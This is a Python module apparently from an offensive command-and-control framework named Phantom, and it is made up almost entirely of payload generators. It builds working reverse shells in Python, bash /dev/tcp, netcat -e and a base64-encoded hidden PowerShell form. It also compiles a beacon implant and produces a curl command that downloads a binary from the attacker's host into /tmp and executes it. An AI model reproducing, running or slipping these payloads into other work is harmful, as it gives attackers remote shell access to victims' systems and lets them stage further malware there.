"""
payloads.py — payload synthesis.

All reverse-shell / stage / beacon command lines are generated here,
never inline in the planner. Platforms: linux, windows, macos, python.
"""

from __future__ import annotations

import os
import sys
from typing import Optional


def python_reverse_shell(lhost: str, lport: int) -> str:
    code = (
        "import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect(('{lhost}',{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        'subprocess.call(["/bin/sh","-i"])'
    )
    return f"python3 -c '{code}'"


def python_callback_probe(lhost: str, lport: int, marker: str = "PHANTOM") -> str:
    """Minimal connect-and-send probe, for real callback verification."""
    code = (
        "import socket;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect(('{lhost}',{lport}));s.sendall(b'{marker}');"
        "s.close()"
    )
    return f"{sys.executable} -c \"{code}\""


def bash_reverse_shell(lhost: str, lport: int) -> str:
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


def netcat_reverse_shell(lhost: str, lport: int, shell: str = "/bin/bash") -> str:
    return f"nc {lhost} {lport} -e {shell}"


def powershell_reverse_shell(lhost: str, lport: int) -> str:
    import base64
    code = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
        "$sb1=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($sb1,0,$sb1.Length);$s.Flush()};$c.Close()"
    )
    # -EncodedCommand requires UTF-16LE, not UTF-8
    b64 = base64.b64encode(code.encode("utf-16-le")).decode("ascii")
    return f"powershell -nop -w hidden -Enc {b64}"


def compile_beacon(platform: str, lhost: str, lport: int, pkg_root: Optional[str] = None,
                   use_ssl: bool = False) -> Optional[str]:
    """Compile a real Phantom beacon; returns binary path or None if toolchain missing."""
    from phantom.utils.builder import compile_beacon as _compile
    root = pkg_root or os.path.join(os.path.dirname(os.path.dirname(__file__)), "..", "..", "..")
    root = os.path.abspath(root)
    return _compile(platform, root, force_rebuild=False, host=lhost, port=lport, use_ssl=use_ssl)


def download_exec_stage(lhost: str, dl_port: int, filename: str) -> str:
    """Download-and-exec command for a staged beacon binary."""
    url = f"http://{lhost}:{dl_port}/{filename}"
    return (f"curl -s {url} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}")
